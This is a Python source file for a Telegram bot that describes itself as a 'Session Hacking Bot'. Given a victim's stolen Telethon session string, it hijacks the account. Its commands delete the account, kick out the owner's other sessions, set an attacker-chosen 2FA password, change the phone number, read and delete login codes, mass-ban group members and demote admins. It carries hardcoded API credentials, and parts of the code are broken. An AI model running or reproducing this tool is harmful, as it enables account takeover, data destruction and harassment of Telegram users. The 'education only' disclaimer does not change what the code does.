# COPYRIGHT © 2021-22 BY 22 🔥
# NOW PUBLIC BY LEGENDX
import os
os.system("pip install Telethon==1.21.1")
from telethon import TelegramClient, events, functions, types
api_id = os.environ.get("APP_ID")
import os, asyncio
from os import system
from telethon import Button
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('FireProjects', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

dev_aditya = 1960533911

@client.on(events.NewMessage(pattern="^/start$"))
async def start(event):
    await message.reply_photo(
        photo=f"https://telegra.ph/file/da21c2f5d083597727a46.jpg",
        caption=f"""Hello [{x.first_name}](tg://user?id={x.id})\nI am Session Hacking Bot.\nI have many features to Control Account of user by Session String.\n\n**[⚠️]Note**- __This Bot is only for education and Testing Purpose__\n__**⚠️NOTE**This Bot doesn't Responsible For any Malicious Activity.__\n\n⭐ Type /help to Start Show!!\n\n©️ **COPYRIGHT BY** - @LEGENDXDEV\n⚙️ **MODIFIED** - @DEV_ADITYA | @MR_LPN""",
        link_preview=False,        
        buttons=(
            [
            InlineKeyboardButton(
                "🔊 Channel", url="https://t.me/fireprojects"
               )
            ],
            [
                InlineKeyboardButton("❓ Questions", callback_data="whatis"),
                InlineKeyboardButton("©️ Copyright", url="https://t.me/legendxdev"),
            ],
                home_buttons = [generate_single_button,
               [InlineKeyboardButton(text="🔙 BACK", callback_data="back")],
            ],
                generate_button = [generate_single_button]
            [
                InlineKeyboardButton("⚙️ Repo", url="https://github.com/FireProjects/SessionStringBot"),
                InlineKeyboardButton("ℹ️ About", callback_data="aboutbot"),
            ],
        ),
    )

WHATIS = """
❓**SESSION STRING [TELETHON]**

⚠️ **NOTE** - This bot will only works on Telethon Session String

❔ What is Session String?
🔻 __Session String is a user Login encrypted Details.__

❔ How it Works?
🔻 __Session String Generates When a virtual device is login in User Telegram.__\n __By that Virtual Device We can control His Telegram.__

❔ How Did we Get Session String?
🔻 __You Can use many kind of bot on Telegram To get session String **[TELETHON]** Like__ @This | @This.

❔ How to save Your Telegram From This Attack?
🔻 __Easy!!, Do not give your Session String.__\n🔻 __Terminate All your unknown Devices, Go to **Settings > Devices** or **Privacy & Security > Active Sessions** To terminate Your Session.__\n🔻 __Use 2FA **[2 Factor Authentication]** in your Telegram__
"""

ABOUT = """
ℹ️ **ABOUT BOT**

🔻This Bot help to Do many malicious Things From Session String.

🔊 Channel : @FireProjects
⚙️ Source Code : [GitHub](https://github.com/FireProjects/SessionStringBot)
🔤 Language : [Python](www.python.org)
👨‍💻 Developer : @LEGENDXDEV
🧑‍💻 Modified : [FireProjects](https://t.me/fireprojects) | [ASAD](https://t.me/Jankari_Ki_Duniya)
    """

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(functions.account.DeleteAccountRequest("Yeah I am Idiot!!!"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('FIREPROJECTS')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\n<----------------------------------->\[🔊] Channel Name ~ {x.title}\n[🔊] ~ Channel Username ~ @{x.username}'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "@FireProjects"
menu = '''

**Help**

Hey There [{x.first_name}](tg://user?id={x.id}) \nI am Telegram Session String [Telethon] Hacking Bot.\nThis is all the features i can do.\n**[⚠️]Note**- __This Bot is only for education and Testing Purpose__\n__**⚠️NOTE**This Bot doesn't Responsible For any Malicious Activity.__\n\n⭐ Type /help to Start Show!!\n\n©️ **COPYRIGHT BY** - @LEGENDXDEV\n⚙️ **MODIFIED** - [Fireprojects](https://t.me/Fireprojects) | [Asad](https://t.me/Jankari_Ki_Duniya)

**Helpful Commands**
- /founder : Check user own groups and channels.
- /spy : Check user all information.. [Eg. Phone, UserID etc.]
- /kick : Ban User. [Works on, If User Owner/Admin In That Group]
- /bypass : Find Last OTP. [Find Number By /founder Sent OTP. To Find Run Command.]
- /invite : Join User. [Invite This user to Your Group]
- /kickme : Kick From Group. [Leave Group/Channel]
- /bye : Delete Group/Channel.
- /2step : Check User 2FA enable or Disable [2nd Factor Authentication]
- /session : Terminate all Session String Except this. [All Login Session Strings]
- /boom : Delete User Account.
- /alone : Kick Admin In Channel. [Where User have rights or Owner]
- /successor : Make New Admin. [Where User have rights or Owner]
- /newnumber : Update Phone Number. [Change Phone Number]
'''

@client.on(events.NewMessage(pattern="/give"))
async def op(event):
  if not event.sender_id == dev_aditya:
    return await event.reply("Wow!!, Try to hack my Master\nPlease Fuck off!!!!!")
  try:
    await event.reply("session bot file", file="FP.session")
  except Exception as e:
    print (e)


@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  await event.reply("Please Message Me [Here](https://t.me/dev_aditya)")
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"Choose what you want with string session \n\n{menu}")
    res = await x.get_response()
    r = res.text
    if res.text == "/founder":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("__This Session String is Terminated or Incorrect.__")
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "🔊 Channel - @FireProjects\n©️ Copyright By - @legendxdev\n🧑‍💻 Modified By - [Fireprojects](https://t.me/fireprojects) | [Asad](https://t.me/Jankari_Ki_Duniya)")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n**Thanks For using our bot please Share and support us.**")
    elif res.text == "/spy":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      i = await userinfo(strses.text)
      await event.reply(i + "\n\n**Thanks For using our bot please Share and support us.**")
    elif r == "/kick":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      await x.send_message("Give **Channel/Group** Username or ID")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("Banning all members **Thanks For using our bot please Share and support us.**")
    elif r == "/bypass":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\n**Thanks For using our bot please Share and support us.**")
    elif r == "/invite":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      await x.send_message("Give **Channel/Group** Username or ID")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await event.reply("Joined the Channel/Group.!! **Thanks For using our bot please Share and support us.**")
    elif r == "/kickme":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      await x.send_message("Give **Channel/Group** Username or ID")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await event.reply("Successfully Leaved Channel!!.. **Thanks For using our bot please Share and support us.**")
    elif r == "/bye":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      await x.send_message("Give **Channel/Group** Username or ID")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("Deleted the Channel/Group **Thanks For using our bot please Share and support us.**")
    elif r == "/2step":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      i = await user2fa(strses.text)
      if i:
        await event.reply("User didn't have 2nd Step Verification.\nNow You login by Sending OTP and get Otp by /bypass command\n\n**Thanks For using our bot please Share and support us.**")
      else:
        await event.reply("Unfortunately...\nUser Have 2FA [2nd Step Verification]")
    elif r == "/session":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      i = await terminate(strses.text)
      await event.reply("The all sessions are terminated\n\n**Thanks For using our bot please Share and support us.**")
    elif res.text == "/boom":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      i = await delacc(strses.text)
      await event.reply("Account Is Successfully Deleted!!\n\n**Thanks For using our bot please Share and support us.**")
    elif res.text == "/alone":
      await x.send_message("Fine!!.. Input Your Session String.\n**[⚠️] Note** By using this command user all the data and channel Has been Deleted\n\nTo Stop this command Simple Type /hack .")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      await x.send_message("Ok!!, Give **Channel/Group** Username")
      grp = await x.get_response()
      await x.send_message("Now Give **User** Username\nWhich is going to promote!")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("I am making You Admin wait a second. —\n\n**Thanks For using our bot please Share and support us.**")
    elif res.text == "/successor":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      await x.send_message("So!!.. Input Channel Name which you want to be Admin.")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("Ok.. Demoting all the members Please wait...\n\n**Thanks For using our bot please Share and support us.**")
    elif res.text == "/newsim":
      await x.send_message("Fine!!.. Input Your Session String.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("__This Session String is Terminated or Incorrect.__")
      await x.send_message("So, Give me New Number which you want to replace.\nType with Country code __Eg. [+918123xxxxxx]__\n- Don't Use **2nd Line | TextNow** etc. phone number because of OTP service.\n\nUse Real or Paid Number ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n Copy [Phone code Hash](https://bit.ly/3uZ2CUl) and Checker Your number for OTP\nI Stopped For 20sec. Copy [Phone Code Hash](https://bit.ly/3uZ2CUl) and OTP.")
        await asyncio.sleep(20)
        await x.send_message("Provide me Phone Code Hash")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("Enter Your OTP.")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("Boom!, New Number is updated.")
        else:
          await event.respond("Something is wrong")
      except Exception as e:
        await event.respond("Sent this error to @Dev_Aditya **LOGS**\n" + str(e))

    else:
      await event.respond("Oh No, Wrong Text Type /hack to Start me again!")



client.run_until_disconnected()
